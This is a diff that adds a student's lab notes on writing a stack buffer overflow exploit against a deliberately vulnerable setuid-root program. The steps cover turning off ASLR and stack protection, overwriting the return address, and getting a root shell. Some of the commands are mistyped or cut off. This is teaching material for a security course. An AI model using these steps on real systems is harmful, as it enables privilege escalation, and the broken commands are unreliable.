@@ -1,0 +1,67 @@
+
+Writing a Buffer Overflow Exploit
+''''''''''''''''''''''''''''''''''
+ASLR
+'''''
+
+Ubuntu and several other Linux distributions use address space randomization to randomize the
+starting address of heap and stack. This makes guessing the exact return address difficult;
+guessing addresses is one of the critical steps of a buffer overflow attack.
+
+$sudo su 
+$echo 0 > /proc/sys/kernel/randomize_va_space   ------>Disables the randomization 
+$cat /proc/sys/kernel/randomize_va_space        ------>0 means disabled,2 sets ASLR
+
+
+STACK GUARD
+'''''''''''
+The GCC compiler implements a security mechanism called Stack Guard to prevent buffer
+overflows. In the presence of this protection, buffer overflow attacks will fail to work. You can
+disable this protection when you are compiling a program using the gcc option -fno-stack-
+
+$gcc -z execstack -fno-stack-protector -o stack stack.c  ---->execstack makes the stack ,executable pgm runs in stack/heap.
+$./stack
+0xbfffef37
+Segmentation fault(coredump) --->occurs because "badfile" was not created
+$touch badfile  -----> creates badfile
+$./stack
+0xbfffef37
+Returned properly
+
+Code change in exploit.c           --->We are replacing the value of saved ebp with nop.So no execution happens . Now we add the return 
+long start = 0xbfffef37 + 300;	       address which contain shell code and thus it executes the shell.
+long* var =(long*)(buffer + 24);
+*var = start;
+
+Now run 
+$gcc exploit.c -o exploit
+$./exploit
+
+$gcc -z execstack -fno-sstack-protector -o stack stack.c
+$./stack
+0xbfffef47
+$ ---->we get the shell //exploited
+$exit
+
+3 commands in task 3
+$gcc -g -o stack -z execstack -fno
+$sudo chown root:root stack
+$sudo chmod 4755 stack---->changes permission ls -al stack  
+$./stack
+0xbfffef47--->we  get return address and #
+# ---->we can get into # (exploited with root permissions)
+#uid---->user id
+#gid---->group id
+
+
+Extra task------>enable randomization
+""""""""""
+sudo su
+echo 2 > /proc/sys/kernel/randomize_va_space
+./stack
+We get SEGFAULT ...Because randomization gets sets.
+# /sbin/sysctl -w kernel.randomize_va_space=2
+Infinite segmentation fault finally stops at # //exploited 
+
+
+
